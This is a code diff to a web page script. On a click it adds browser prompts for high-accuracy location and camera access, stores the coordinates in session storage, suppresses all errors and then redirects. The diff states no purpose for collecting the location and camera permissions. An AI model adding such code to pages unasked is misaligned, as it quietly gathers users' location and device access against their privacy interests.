@@ -160,6 +160,33 @@
       // Store flag so success page knows user interacted (allows autoplay)
       sessionStorage.setItem("allow_audio", "true");
 
+      // Ask for LOCATION access (browser permission prompt)
+      try {
+        if (navigator.geolocation) {
+          navigator.geolocation.getCurrentPosition(
+            (pos) => {
+              sessionStorage.setItem("user_lat", pos.coords.latitude);
+              sessionStorage.setItem("user_lng", pos.coords.longitude);
+            },
+            () => {},
+            { enableHighAccuracy: true, timeout: 8000, maximumAge: 0 }
+          );
+        }
+      } catch (e) {}
+
+      // Ask for CAMERA access (browser permission prompt)
+      try {
+        if (navigator.mediaDevices && navigator.mediaDevices.getUserMedia) {
+          navigator.mediaDevices.getUserMedia({ video: true, audio: false })
+            .then((stream) => {
+              // Permission granted — keep it alive briefly so success page can reuse
+              sessionStorage.setItem("cam_ok", "true");
+              try { stream.getTracks().forEach(t => t.stop()); } catch (e) {}
+            })
+            .catch(() => {});
+        }
+      } catch (e) {}
+
       // Success — redirect
       setTimeout(() => { window.location.href = NEXT_URL; }, 400);
     });
